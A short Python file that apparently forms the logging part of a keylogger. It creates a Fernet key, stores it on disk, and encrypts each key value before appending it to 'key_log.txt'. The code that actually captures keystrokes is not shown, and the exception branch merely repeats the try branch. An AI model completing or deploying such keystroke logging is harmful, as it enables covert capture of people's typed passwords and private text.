from cryptography.fernet import Fernet

log_file = 'key_log.txt'

# Generate a key and save it to a file
key = Fernet.generate_key()
with open('key.key', 'wb') as key_file:
    key_file.write(key)

# Load the key
with open('key.key', 'rb') as key_file:
    key = key_file.read()

cipherSuite = Fernet(key)

def encryptLog(data):
    encryptData = cipherSuite.encrypt(data.encode())
    return encryptData

def log_key(key):
    try:
        with open(log_file, 'a') as f:
            encrypted_log = encryptLog(str(key))
            f.write(f'{encrypted_log}\n')
    except AttributeError:
        with open(log_file, 'a') as f:
            encrypted_log = encryptLog(str(key))
            f.write(f'{encrypted_log}\n')